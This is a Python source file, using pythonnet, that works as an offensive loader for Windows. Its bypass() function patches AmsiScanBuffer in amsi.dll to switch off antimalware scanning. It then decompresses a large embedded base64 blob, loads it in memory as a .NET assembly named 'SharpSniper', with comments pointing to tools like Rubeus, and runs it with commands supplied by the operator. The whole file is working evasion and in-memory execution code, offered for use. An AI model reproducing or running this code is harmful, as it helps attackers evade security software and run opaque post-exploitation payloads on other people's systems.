import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSniper.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()